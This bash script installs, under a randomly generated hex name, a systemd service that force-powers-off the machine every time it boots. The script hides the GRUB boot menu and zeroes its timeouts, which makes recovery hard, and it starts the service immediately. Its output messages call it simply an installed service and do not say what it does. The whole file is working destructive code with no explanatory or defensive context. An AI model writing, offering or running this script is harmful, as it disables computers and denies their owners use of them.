#!/usr/bin/env bash
set -euo pipefail
VERSION=2.0.0
SERVICE_NAME="$(openssl rand -hex "$(shuf -i 4-128 -n 1)")"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

if [[ $EUID -ne 0 ]]; then
  echo "Please run as root:"
  echo "sudo $0"
  exit 1
fi

disable_grub_screen() {
  sudo sed -i \
    -e 's/^GRUB_TIMEOUT_STYLE=.*/GRUB_TIMEOUT_STYLE=hidden/' \
    -e 's/^GRUB_TIMEOUT=.*/GRUB_TIMEOUT=0/' \
    -e 's/^GRUB_RECORDFAIL_TIMEOUT=.*/GRUB_RECORDFAIL_TIMEOUT=0/' \
    /etc/default/grub

  grep -q '^GRUB_TIMEOUT_STYLE=' /etc/default/grub || echo 'GRUB_TIMEOUT_STYLE=hidden' | sudo tee -a /etc/default/grub >/dev/null
  grep -q '^GRUB_TIMEOUT=' /etc/default/grub || echo 'GRUB_TIMEOUT=0' | sudo tee -a /etc/default/grub >/dev/null
  grep -q '^GRUB_RECORDFAIL_TIMEOUT=' /etc/default/grub || echo 'GRUB_RECORDFAIL_TIMEOUT=0' | sudo tee -a /etc/default/grub >/dev/null

  sudo update-grub
}

cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=$SERVICE_NAME
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/systemctl poweroff --force --force
Restart=always
RestartSec=5
User=root
WorkingDirectory=/

[Install]
WantedBy=multi-user.target
EOF

disable_grub_screen
systemctl daemon-reload
systemctl enable "$SERVICE_NAME"
echo -e "\n\nService installed and enabled.\n"
echo -e "\n\nService starting....\n"
systemctl start "$SERVICE_NAME"
